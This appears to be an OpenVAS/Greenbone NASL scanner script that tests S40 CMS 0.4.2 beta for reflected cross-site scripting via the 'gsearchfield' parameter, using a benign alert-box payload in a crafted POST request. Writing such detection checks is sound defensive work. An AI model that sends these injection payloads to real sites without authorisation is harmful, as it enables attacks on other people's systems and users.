# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801961");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("S40 Content Management System (CMS) Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=209");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_S40_CMS_XSS.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of a vulnerable
  site. This may allow an attacker to steal cookie-based authentications and launch
  further attacks.");

  script_tag(name:"affected", value:"S40 Content Management System (CMS) v0.4.2 beta and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  passed via the 'gsearchfield' parameter in 'index.php' is not properly verified
  before it is returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"S40 Content Management System (CMS) is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir(make_list_unique("/cms", "/", "/s40", "/s40cms", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  res = http_get_cache(item: dir + "/index.php", port:port);

  if("Powered by S40 CMS" >< res)
  {
    postData = "gsearchfield=<script>alert('VT-XSS-TEST')</script>" +
               "&gs=true&gsearchsubmit=Search";

    url = dir + "/index.php";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", http_get_user_agent(), "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n\r\n", postData);

    res = http_keepalive_send_recv(port:port, data:req);

    if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) &&
     ("'<script>alert('VT-XSS-TEST')</script>" >< res))
    {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
